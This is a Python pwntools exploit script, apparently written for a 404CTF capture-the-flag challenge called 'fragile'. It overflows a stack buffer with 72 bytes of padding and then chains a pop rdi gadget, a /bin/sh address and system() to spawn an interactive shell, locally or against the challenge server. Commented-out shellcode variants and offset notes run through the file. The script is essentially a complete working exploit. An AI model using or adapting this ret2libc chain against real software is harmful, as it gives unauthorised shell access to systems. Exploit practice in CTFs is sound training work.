#!/usr/bin/env python3
from pwn import *

TEST = True

context.update(arch="amd64", os="linux", endian="little", bits=64)

shellcode = shellcraft.sh()

#print(shellcode)
#print(hexdump(asm(shellcode)))
#print(len(asm(shellcode)))

#exit()

def craft(addr):
    pl = b"A" * 64
    pl += cyclic(50)
    return pl + addr.encode()

# len shellcode = 48
# len buffer = 72 (64+padding)
# len ebp = 8
# nops = 72 + 8 - 48 = 32

# offset of rsp is 72
# pop rdi gadget at 

# 3 /bin/sh found :
# 0x7ffff7f71152 in libc
# 0x7ffff7fadf70 and 0x7ffff7fadf80 in my own prog

# 64 / 48 
def payload(addr):
    #pl = b"\x90" * 24
    #pl += asm(shellcode)
    #pl += p64(int(addr, 16))
    
    pl = b"\x90" * 72 # offset
    pl += p64(0x00000000004006d3) # pop rdi
    pl += p64(0x7ffff7f71152) # sh
    pl += p64(0x7ffff7e2fe50) # system
    print(pl)
    return pl

def main():
    if TEST:
        nc = process("./fragile")
    else:
        nc = remote("challenge.404ctf.fr", 31720)
    
    nc.readuntil(b"Cadeau : ")
    r = nc.readline()
    nc.sendline(payload(r))
    nc.interactive()

#print(cyclic_find("qaaa"))
main()
